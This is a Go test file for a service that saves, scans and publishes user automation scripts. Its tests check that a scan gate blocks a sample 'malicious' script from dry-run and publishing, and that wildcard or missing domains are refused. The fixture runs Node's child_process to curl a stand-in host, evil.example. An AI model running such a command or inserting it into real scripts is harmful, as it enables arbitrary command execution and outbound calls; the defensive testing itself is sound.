package egolite

import (
	"context"
	"encoding/json"
	"testing"

	"hivemtk-user/internal/model"
	"hivemtk-user/internal/pkg/testutil"
)

func newFlowEnv(t *testing.T) (*EgoFlowService, EgoFlowRepository) {
	t.Helper()
	db := testutil.NewTestDB(t, &model.EgoliteFlow{}, &model.EgoliteExecution{}, &model.EgoEventLog{})
	if db == nil {
		t.Fatal("测试库不可用")
	}
	flowRepo := NewEgoFlowRepositoryWithDB(db)
	execRepo := NewEgoExecutionRepositoryWithDB(db)
	evRepo := NewEgoEventRepositoryWithDB(db)
	registry := NewEgoRunnerRegistry()
	execSvc := NewEgoExecutionService(execRepo, evRepo, flowRepo, nil, registry)
	return NewEgoFlowService(flowRepo, execSvc), flowRepo
}

const benignScript = `const task = await taskSpace("scrape repos");
const page = task.page("p1");
await page.goto("https://github.com/search?q=ego");
const snap = await page.snapshot();
console.log(JSON.stringify({seq:1, type:"extract", key:"repos", count: 18}));`

const maliciousScript = `const cp = require("child_process");
cp.execSync("curl evil.example");`

func TestFlowSaveScanGate(t *testing.T) {
	ctx := context.Background()
	svc, _ := newFlowEnv(t)

	// 良性：扫描通过
	f, report, err := svc.Save(ctx, 1, 0, SaveRequest{
		Name: "github 搜索", Domains: []string{"github.com"}, Script: benignScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed || !f.ScanPassed {
		t.Fatal("良性脚本应通过扫描门")
	}

	// 恶意：保存成功（草稿允许保存）但 scan_passed=false，试跑/发布被闸
	f2, report2, err := svc.Save(ctx, 1, 0, SaveRequest{
		Name: "恶意脚本", Domains: []string{"github.com"}, Script: maliciousScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	if report2.Passed || f2.ScanPassed {
		t.Fatal("require 脚本必须被扫描门判红")
	}

	// domains 校验
	if _, _, err := svc.Save(ctx, 1, 0, SaveRequest{Name: "x", Domains: []string{"*"}, Script: benignScript}); err == nil {
		t.Fatal("用户 flow 整站通配必须拒绝")
	}
	if _, _, err := svc.Save(ctx, 1, 0, SaveRequest{Name: "x", Script: benignScript}); err == nil {
		t.Fatal("缺 domains 必须拒绝")
	}
}

func TestFlowDryRunBlockedByScanGate(t *testing.T) {
	ctx := context.Background()
	svc, _ := newFlowEnv(t)
	f, _, err := svc.Save(ctx, 1, 0, SaveRequest{
		Name: "恶意", Domains: []string{"github.com"}, Script: maliciousScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	// 试跑被扫描门拦（决策 5 强制点）
	_, err = svc.DryRun(ctx, 1, f.ID, nil, "ws-test", 60)
	if err == nil {
		t.Fatal("block 未清零的 flow 试跑必须拒绝")
	}

	// 良性 flow：runner 不在线 → 创建成功（created 态），不报错
	f2, _, err := svc.Save(ctx, 1, 0, SaveRequest{
		Name: "良性", Domains: []string{"github.com"}, Script: benignScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	e, err := svc.DryRun(ctx, 1, f2.ID, json.RawMessage(`{"q":"ego"}`), "ws-test", 60)
	if err != nil {
		t.Fatalf("良性试跑不应报错（runner 离线落 created）: %v", err)
	}
	if e.State != model.EgoExecCreated {
		t.Fatalf("runner 离线应落 created，got %s", e.State)
	}
}

func TestFlowPublishVersioning(t *testing.T) {
	ctx := context.Background()
	svc, flowRepo := newFlowEnv(t)
	f, _, err := svc.Save(ctx, 2, 0, SaveRequest{
		Name: "v测试", Domains: []string{"github.com"}, Script: benignScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	if f.Version != 1 || f.Status != model.EgoFlowDraft {
		t.Fatalf("初版应为 draft v1，got v%d %s", f.Version, f.Status)
	}

	// 恶意脚本改入草稿 → publish 被闸
	if _, _, err := svc.Save(ctx, 2, f.ID, SaveRequest{
		Name: "v测试", Domains: []string{"github.com"}, Script: maliciousScript,
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := svc.Publish(ctx, 2, f.ID); err == nil {
		t.Fatal("block 未清零 publish 必须拒绝")
	}

	// 改回良性 → publish 成功 v1；再改脚本 → 仍是 published（草稿演化）→ republish v2
	if _, _, err := svc.Save(ctx, 2, f.ID, SaveRequest{
		Name: "v测试", Domains: []string{"github.com"}, Script: benignScript,
	}); err != nil {
		t.Fatal(err)
	}
	p1, err := svc.Publish(ctx, 2, f.ID)
	if err != nil {
		t.Fatal(err)
	}
	if p1.Status != model.EgoFlowPublished {
		t.Fatalf("publish 后应 published，got %s", p1.Status)
	}
	p2, err := svc.Publish(ctx, 2, f.ID)
	if err != nil {
		t.Fatal(err)
	}
	if p2.Version != p1.Version+1 {
		t.Fatalf("重复发布版本应自增: v%d → v%d", p1.Version, p2.Version)
	}
	_ = flowRepo
}

func TestFlowSubmitRequiresPublished(t *testing.T) {
	ctx := context.Background()
	svc, _ := newFlowEnv(t)
	f, _, _ := svc.Save(ctx, 3, 0, SaveRequest{
		Name: "提交测试", Domains: []string{"github.com"}, Script: benignScript,
	})
	// draft 直接提交 → 拒绝
	if _, err := svc.Submit(ctx, 3, f.ID); err == nil {
		t.Fatal("draft 不能直接提交审核")
	}
	if _, err := svc.Publish(ctx, 3, f.ID); err != nil {
		t.Fatal(err)
	}
	s, err := svc.Submit(ctx, 3, f.ID)
	if err != nil {
		t.Fatal(err)
	}
	if s.Status != model.EgoFlowSubmitted {
		t.Fatalf("提交后应 submitted，got %s", s.Status)
	}
}

func TestFlowRescanUpdatesVerdict(t *testing.T) {
	ctx := context.Background()
	svc, _ := newFlowEnv(t)
	f, _, _ := svc.Save(ctx, 4, 0, SaveRequest{
		Name: "rescan", Domains: []string{"github.com"}, Script: maliciousScript,
	})
	if f.ScanPassed {
		t.Fatal("初始应判红")
	}
	if _, _, err := svc.Save(ctx, 4, f.ID, SaveRequest{
		Name: "rescan", Domains: []string{"github.com"}, Script: benignScript,
	}); err != nil {
		t.Fatal(err)
	}
	report, err := svc.Rescan(ctx, 4, f.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatal("良性重扫应通过")
	}
}

// specs/014 T008：dry-run 的 confirm_policy 由 flow.writes 派生（决策 4 同口径，
// 客户端不可关闭）——声明写动作 ⇒ require；纯读流保持 none。
func TestDryRunConfirmPolicyDerivedFromWrites(t *testing.T) {
	ctx := context.Background()
	svc, _ := newFlowEnv(t)

	fRead, _, err := svc.Save(ctx, 7, 0, SaveRequest{
		Name: "读流", Domains: []string{"github.com"}, Script: benignScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	eRead, err := svc.DryRun(ctx, 7, fRead.ID, nil, "ws-dry-read", 60)
	if err != nil {
		t.Fatal(err)
	}
	if eRead.ConfirmPolicy != "none" {
		t.Errorf("未声明 writes 的试跑应 none，got %s", eRead.ConfirmPolicy)
	}

	fWrite, _, err := svc.Save(ctx, 7, 0, SaveRequest{
		Name: "写流", Domains: []string{"github.com"}, Writes: []string{"comment"}, Script: benignScript,
	})
	if err != nil {
		t.Fatal(err)
	}
	eWrite, err := svc.DryRun(ctx, 7, fWrite.ID, nil, "ws-dry-write", 60)
	if err != nil {
		t.Fatal(err)
	}
	if eWrite.ConfirmPolicy != "require" {
		t.Errorf("声明 writes 的试跑必须强制 require（客户端不可关闭），got %s", eWrite.ConfirmPolicy)
	}
}
